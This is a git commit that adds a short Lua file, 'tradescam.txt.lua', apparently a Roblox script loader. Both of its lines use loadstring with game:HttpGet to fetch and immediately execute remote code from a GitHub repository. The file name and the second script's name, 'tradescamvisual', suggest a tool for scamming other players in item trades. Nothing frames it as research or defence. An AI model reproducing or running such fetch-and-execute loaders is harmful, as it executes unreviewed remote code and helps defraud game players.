1a0a4b384a8e915587619cca8ac8a052b7a6a735
MakalHub <michaeldolii1603@gmail.com>
2025-04-07 10:09:45 +0700

    Create tradescam.txt.lua

---
+++ tradescam.txt.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MakalHub/Script/refs/heads/main/core.txt.lua",true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MakalHub/Test/refs/heads/main/tradescamvisual.txt.lua",true))()
